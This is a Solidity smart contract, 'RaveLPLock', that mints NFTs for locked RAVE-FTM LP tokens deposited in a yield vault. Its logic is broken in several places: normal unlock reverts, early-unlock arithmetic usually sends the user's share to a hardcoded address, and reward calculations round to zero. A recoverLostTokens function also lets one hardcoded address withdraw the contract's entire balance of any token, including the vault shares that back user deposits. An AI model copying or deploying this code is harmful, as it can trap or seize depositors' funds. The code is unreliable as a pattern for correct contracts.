pragma solidity >=0.8.10;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "@openzeppelin/contracts/utils/Strings.sol";
import "@openzeppelin/contracts/utils/Base64.sol";

interface Router {
    function removeLiquidity(
        address tokenA,
        address tokenB,
        bool stable,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);
}

interface Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Claim(
        address indexed sender,
        address indexed recipient,
        uint256 amount0,
        uint256 amount1
    );
    event Fees(address indexed sender, uint256 amount0, uint256 amount1);
    event Initialized(uint8 version);
    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint256 reserve0, uint256 reserve1);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    function allowance(address, address) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function blockTimestampLast() external view returns (uint256);

    function burn(
        address to
    ) external returns (uint256 amount0, uint256 amount1);

    function claimFees() external returns (uint256 claimed0, uint256 claimed1);

    function claimable0(address) external view returns (uint256);

    function claimable1(address) external view returns (uint256);

    function current(
        address tokenIn,
        uint256 amountIn
    ) external view returns (uint256 amountOut);

    function currentCumulativePrices()
        external
        view
        returns (
            uint256 reserve0Cumulative,
            uint256 reserve1Cumulative,
            uint256 blockTimestamp
        );

    function decimals() external view returns (uint8);

    function factory() external view returns (address);

    function fees() external view returns (address);

    function getAmountOut(
        uint256 amountIn,
        address tokenIn
    ) external view returns (uint256);

    function getReserves()
        external
        view
        returns (
            uint256 _reserve0,
            uint256 _reserve1,
            uint256 _blockTimestampLast
        );

    function index0() external view returns (uint256);

    function index1() external view returns (uint256);

    function initialize() external;

    function metadata()
        external
        view
        returns (
            uint256 dec0,
            uint256 dec1,
            uint256 r0,
            uint256 r1,
            bool st,
            address t0,
            address t1
        );

    function mint(address to) external returns (uint256 liquidity);

    function name() external view returns (string memory);

    function nonces(address) external view returns (uint256);

    function observationLength() external view returns (uint256);

    function observations(
        uint256
    )
        external
        view
        returns (
            uint256 timestamp,
            uint256 reserve0Cumulative,
            uint256 reserve1Cumulative
        );

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function prices(
        address tokenIn,
        uint256 amountIn,
        uint256 points
    ) external view returns (uint256[] memory);

    function quote(
        address tokenIn,
        uint256 amountIn,
        uint256 granularity
    ) external view returns (uint256 amountOut);

    function reserve0() external view returns (uint256);

    function reserve0CumulativeLast() external view returns (uint256);

    function reserve1() external view returns (uint256);

    function reserve1CumulativeLast() external view returns (uint256);

    function sample(
        address tokenIn,
        uint256 amountIn,
        uint256 points,
        uint256 window
    ) external view returns (uint256[] memory);

    function skim(address to) external;

    function stable() external view returns (bool);

    function supplyIndex0(address) external view returns (uint256);

    function supplyIndex1(address) external view returns (uint256);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes memory data
    ) external;

    function symbol() external view returns (string memory);

    function sync() external;

    function token0() external view returns (address);

    function token1() external view returns (address);

    function tokens() external view returns (address, address);

    function totalSupply() external view returns (uint256);

    function transfer(address dst, uint256 amount) external returns (bool);

    function transferFrom(
        address src,
        address dst,
        uint256 amount
    ) external returns (bool);
}

interface GrimVault {
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function available() external view returns (uint256);

    function balance() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) external returns (bool);

    function deposit(uint256 _amount) external;

    function depositAll() external;

    function getPricePerFullShare() external view returns (uint256);

    function inCaseTokensGetStuck(address _token) external;

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) external returns (bool);

    function name() external view returns (string memory);

    function owner() external view returns (address);

    function proposeStrat(address _implementation) external;

    function renounceOwnership() external;

    function stratCandidate()
        external
        view
        returns (address implementation, uint256 proposedTime);

    function strategist() external view returns (address);

    function strategy() external view returns (address);

    function symbol() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function transferOwnership(address newOwner) external;

    function upgradeStrat() external;

    function want() external view returns (address);

    function withdraw(uint256 _shares) external;

    function withdrawAll() external;
}

contract RaveLPLock is ERC721Enumerable {
    uint256 private constant YEAR = 52 weeks;
    mapping(uint256 => Lock) locks;
    mapping(uint256 => bool) claimed;
    uint256 constant MAX_LOCK = YEAR / 2;
    Pair immutable lp;
    GrimVault immutable vault;
    uint256 amountLeft = 100_000 * 10 ** 18;
    uint256 constant reward = 125;
    IERC20 constant RAVE = IERC20(0x88888a335b1F65a79Ec56A610D865b8b25B6060B);
    Router constant router = Router(0x1A05EB736873485655F29a37DEf8a0AA87F5a447);
    bool migration = false;

    constructor(
        address _lp,
        address _vault
    ) ERC721("Locked Autocompounding RAVE-FTM LP", "laRAVE") {
        lp = Pair(_lp);
        vault = GrimVault(_vault);
        RAVE.approve(_vault, 690000000000000000000000 * 10 ** 18);
    }

    struct Lock {
        address creator;
        uint amount;
        uint rave;
        uint unlock;
        uint time;
        bool active;
        uint amountLeftAtTime;
    }

    function getValueOfLPInRAVE(
        uint lpAmount
    ) public view returns (uint256 valueOfLP) {
        uint totalLPSupply = lp.totalSupply();
        (, uint _reserve0, ) = lp.getReserves();
        valueOfLP = ((_reserve0 * 2) / totalLPSupply) * lpAmount;
    }

    function calculateAllocatedRAVE(
        uint256 lpAmount,
        uint256 time
    ) public view returns (uint256) {
        uint valueOfAmount = lpAmount * getValueOfLPInRAVE(lpAmount);
        uint raveAtMaxTime = (valueOfAmount * reward) / 1000;
        return (raveAtMaxTime * time * 2) / (52 weeks);
    }

    function lock(uint256 amount, uint256 time) external payable {
        uint allocatedRAVE = calculateAllocatedRAVE(amount, time);
        require(
            allocatedRAVE < amountLeft,
            "The program has ended, or you are locking too much RAVE/FTM."
        );
        require(time >= (YEAR / 12), "You must lock for at least 1 month");
        lp.transferFrom(msg.sender, address(this), amount);
        uint balanceOfShares = vault.balanceOf(address(this));
        vault.deposit(amount);
        uint shares = vault.balanceOf(address(this)) - balanceOfShares;
        amountLeft = amountLeft - allocatedRAVE;
        uint tokenId = uint256(uint160(msg.sender)) + block.timestamp;
        locks[tokenId] = Lock(
            msg.sender,
            shares,
            allocatedRAVE,
            block.timestamp + time,
            time,
            true,
            amountLeft
        );
        _mint(msg.sender, tokenId);
    }

    function unlock(uint256 tokenId) external payable {
        Lock memory _lock = locks[tokenId];
        require(block.timestamp >= _lock.unlock, "Token still locked");
        require(msg.sender == ownerOf(tokenId), "Not the owner of the lock");
        require(_lock.active, "Lock has been closed");
        _burn(tokenId);
        vault.withdraw(_lock.amount);
        RAVE.transferFrom(address(this), ownerOf(tokenId), _lock.rave);
        lp.transferFrom(
            address(this),
            ownerOf(tokenId),
            _lock.amount * vault.getPricePerFullShare()
        );
        locks[tokenId].active = false;
    }

    function unlockEarly(uint256 tokenId) external payable {
        Lock memory _lock = locks[tokenId];
        require(block.timestamp < _lock.unlock, "Token unlocked");
        require(msg.sender == ownerOf(tokenId), "Not the owner of the lock");
        require(_lock.active, "Lock has been closed");
        uint lockStart = _lock.unlock - _lock.time;
        uint timeLocked = block.timestamp - lockStart;
        uint mod = (migration) ? (1) : (timeLocked / MAX_LOCK);
        uint amount = _lock.amount * vault.getPricePerFullShare();
        vault.withdraw(_lock.amount);
        RAVE.transferFrom(address(this), ownerOf(tokenId), _lock.rave * mod);
        lp.transferFrom(address(this), ownerOf(tokenId), _lock.amount * mod);
        router.removeLiquidity(
            lp.token0(),
            lp.token1(),
            lp.stable(),
            amount - (amount * mod),
            0,
            0,
            address(this),
            block.timestamp
        );
        uint raveToSend = (getValueOfLPInRAVE(amount - (amount * mod)) / 2) +
            (_lock.rave - _lock.rave * mod);
        RAVE.transferFrom(
            address(this),
            0x87f385d152944689f92Ed523e9e5E9Bd58Ea62ef,
            (_lock.rave - (_lock.rave * mod)) + raveToSend
        );
        locks[tokenId].active = false;
    }

    function claimRewards(uint256 tokenId) external payable {
        Lock memory _lock = locks[tokenId];
        require(block.timestamp < _lock.unlock, "Token unlocked");
        require(msg.sender == ownerOf(tokenId), "Not the owner of the lock");
        require(!claimed[tokenId], "Already claimed for this tokenId");
        uint percentOfMax = _lock.rave / _lock.amountLeftAtTime;
        uint ftmAllocated = percentOfMax * address(this).balance;
        claimed[tokenId] = true;
        payable(msg.sender).transfer(ftmAllocated);
    }

    function checkPenalty(uint256 tokenId) public view returns (uint256) {
        Lock memory _lock = locks[tokenId];
        uint lockStart = _lock.unlock - _lock.time;
        uint timeLocked = block.timestamp - lockStart;
        uint mod = (migration) ? (1) : (timeLocked / MAX_LOCK);
        return 1 - mod;
    }

    function checkRewards(uint256 tokenId) public view returns (uint256) {
        Lock memory _lock = locks[tokenId];
        uint percentOfMax = _lock.rave / _lock.amountLeftAtTime;
        uint ftmAllocated = percentOfMax * address(this).balance;
        return (claimed[tokenId]) ? 0 : ftmAllocated;
    }

    // a multicall-type view so we only need to call this once/tokenId
    // we could do this in the frontend, but its just so much easier this way
    function checkDetails(
        uint256 tokenId
    ) external view returns (Lock memory, bool, uint256, uint256) {
        return (
            locks[tokenId],
            claimed[tokenId],
            checkPenalty(tokenId),
            checkRewards(tokenId)
        );
    }

    function startMigration() external {
        require(
            msg.sender == 0x3e522051A9B1958Aa1e828AC24Afba4a551DF37d,
            "LPLocker: Not owner"
        );
        migration = true;
        RAVE.transferFrom(address(this), msg.sender, amountLeft);
    }

    function tokenURI(
        uint256 tokenId
    ) public view override(ERC721) returns (string memory output) {
        output = '<svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMinYMin meet" viewBox="0 0 350 350"><style>.base { fill: white; font-family: Veranda, serif; font-size: 14px; }</style><rect width="100%" height="100%" fill="black" /><text x="10" y="20" class="base">';
        output = string(
            abi.encodePacked(
                output,
                "Token ID",
                Strings.toString(tokenId),
                '</text><text x="10" y="40" class="base">'
            )
        );
        output = string(
            abi.encodePacked(
                output,
                "Locked LP (18 decimals)",
                Strings.toString(locks[tokenId].amount),
                '</text><text x="10" y="60" class="base">'
            )
        );
        output = string(
            abi.encodePacked(
                output,
                "End Time ",
                Strings.toString(locks[tokenId].unlock),
                '</text><text x="10" y="80" class="base">'
            )
        );
        output = string(
            abi.encodePacked(
                output,
                "FTM Rewards (18 decimals)",
                Strings.toString(checkRewards(tokenId)),
                '</text><text x="10" y="80" class="base">'
            )
        );
        output = string(
            abi.encodePacked(
                output,
                "RAVE to be rewarded (18 decimals)",
                Strings.toString(locks[tokenId].rave),
                "</text></svg>"
            )
        );

        string memory json = Base64.encode(
            bytes(
                string(
                    abi.encodePacked(
                        '{"name": "Rave Lock #',
                        Strings.toString(tokenId),
                        '", "description": "RAVE-FTM LP locks earn RAVE and autocompound Equalizer farm rewards.", "image": "data:image/svg+xml;base64,',
                        Base64.encode(bytes(output)),
                        '"}'
                    )
                )
            )
        );
        output = string(
            abi.encodePacked("data:application/json;base64,", json)
        );
    }

    function recoverLostTokens(address token) external {
        require(msg.sender == 0x87f385d152944689f92Ed523e9e5E9Bd58Ea62ef);
        IERC20(token).transferFrom(
            address(this),
            0x87f385d152944689f92Ed523e9e5E9Bd58Ea62ef,
            IERC20(token).balanceOf(address(this))
        );
    }
}
